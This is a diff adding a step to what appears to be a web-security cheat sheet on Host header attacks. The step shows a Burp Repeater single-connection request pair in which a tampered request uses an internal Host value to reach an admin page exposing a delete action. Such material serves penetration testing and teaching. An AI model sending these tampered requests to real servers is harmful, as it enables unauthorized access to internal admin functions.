@@ -56,5 +56,23 @@ Host: evil-website.com
 ...
 ```
 
+6.Burp Repeater "Send group (single connection)" Original+tampering
+```
+### Request Original:
+GET / HTTP/1.1
+Host: www.vuln.com
+Connection: keep-alive
+
+### Request Tampering:
+GET /admin HTTP/1.1
+Host: 192.168.0.1
+Connection: keep-alive
+
+### Response Tampering:
+HTTP/1.1 200 OK
+…
+<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
+ ```
+
 ## References
 * [PortSwigger](https://portswigger.net/web-security/host-header/exploiting)
